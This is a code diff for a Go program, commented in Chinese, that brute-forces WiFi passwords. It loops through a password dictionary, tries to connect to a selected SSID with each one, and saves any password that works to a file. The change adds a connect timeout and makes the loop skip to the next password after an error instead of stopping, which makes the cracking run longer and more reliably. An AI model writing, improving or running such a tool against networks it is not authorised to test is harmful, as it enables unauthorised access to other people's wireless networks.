@@ -57,47 +57,86 @@ func main() {
 	//)
 
 	//pwddict := []string{"66666666", "qpqp1010..", "12345678"}
-	var couter int
-	for _, asd := range Dict.WifiDict {
-		var now = time.Now()
-		couter++
-		fmt.Println("-------------------------- 第", couter, "次尝试--------------------------")
+	// var couter int
+	// for _, asd := range Dict.WifiDict {
+	// 	var now = time.Now()
+	// 	couter++
+	// 	fmt.Println("-------------------------- 第", couter, "次尝试--------------------------")
 
-		//log.Println("测试 password: ", asd)
+	// 	//log.Println("测试 password: ", asd)
+	// 	gologger.Info().Msgf("测试 password: %s", asd)
+	// 	wc := wifi.New(selection.SSID, asd)
+
+	// 	stat, err := wc.Connect()
+	// 	if err != nil {
+	// 		//log.Println("连接 WiFi 失败:", err)
+	// 		gologger.Error().Msgf("连接 WiFi 失败: %s", err)
+	// 		return
+	// 	}
+	// 	if stat == wifi.Connected {
+	// 		//log.Println("连接 WiFi 成功:", selection.SSID, asd)
+	// 		gologger.Info().TimeStamp().Msgf("成功连接 WiFi (%s) : 密码(%s)", selection.SSID, asd)
+	// 		err = util.WriteToFile(setting.SuccessPwdSavePath, fmt.Sprintf("WiFi: %s, password: %s\n", wc.Ssid, asd))
+	// 		if err != nil {
+	// 			gologger.Error().Msgf("将密码写入文件 ERR: %s ", err)
+	// 			//log.Println("将密码写入文件 ERR: ", err)
+	// 		}
+	// 		return
+	// 	}
+	// 	//log.Println("连接 WiFi 失败")
+	// 	gologger.Error().TimeStamp().Msgf("连接 WiFi 失败")
+	// 	err = wc.DeleteProfile()
+	// 	if err != nil {
+	// 		gologger.Error().Msgf("删除配置文件失败: %s", err)
+	// 		//log.Println("删除配置文件失败:", err)
+	// 		return
+	// 	}
+	// 	//log.Println("删除配置文件成功")
+	// 	gologger.Info().Msgf("删除配置文件成功")
+	// 	gologger.Info().Msgf("总计时间: %s, 当前花费时间: %s",
+	// 		time.Since(start).Truncate(time.Second).String(),
+	// 		time.Since(now).Truncate(time.Second).String(),
+	// 	)
+	// }
+	var counter int
+	for _, asd := range Dict.WifiDict {
+		counter++
+		now := time.Now()
+		fmt.Println("-------------------------- 第", counter, "次尝试--------------------------")
+
 		gologger.Info().Msgf("测试 password: %s", asd)
 		wc := wifi.New(selection.SSID, asd)
 
+		// 1. 带超时连接
+		wifi.DefaultConnectTimeout = 5 * time.Second
 		stat, err := wc.Connect()
 		if err != nil {
-			//log.Println("连接 WiFi 失败:", err)
 			gologger.Error().Msgf("连接 WiFi 失败: %s", err)
-			return
+			// 2. 继续跑下一个密码，而不是直接退出
+			continue
 		}
+
 		if stat == wifi.Connected {
-			//log.Println("连接 WiFi 成功:", selection.SSID, asd)
 			gologger.Info().TimeStamp().Msgf("成功连接 WiFi (%s) : 密码(%s)", selection.SSID, asd)
-			err = util.WriteToFile(setting.SuccessPwdSavePath, fmt.Sprintf("WiFi: %s, password: %s\n", wc.Ssid, asd))
-			if err != nil {
+			if err := util.WriteToFile(setting.SuccessPwdSavePath,
+				fmt.Sprintf("WiFi: %s, password: %s\n", wc.Ssid, asd)); err != nil {
 				gologger.Error().Msgf("将密码写入文件 ERR: %s ", err)
-				//log.Println("将密码写入文件 ERR: ", err)
 			}
-			return
+			return // 成功就可退出了
 		}
-		//log.Println("连接 WiFi 失败")
+
 		gologger.Error().TimeStamp().Msgf("连接 WiFi 失败")
-		err = wc.DeleteProfile()
-		if err != nil {
+		if err := wc.DeleteProfile(); err != nil {
 			gologger.Error().Msgf("删除配置文件失败: %s", err)
-			//log.Println("删除配置文件失败:", err)
-			return
+			continue
 		}
-		//log.Println("删除配置文件成功")
 		gologger.Info().Msgf("删除配置文件成功")
 		gologger.Info().Msgf("总计时间: %s, 当前花费时间: %s",
 			time.Since(start).Truncate(time.Second).String(),
 			time.Since(now).Truncate(time.Second).String(),
 		)
 	}
+
 }
 
 type Options struct {
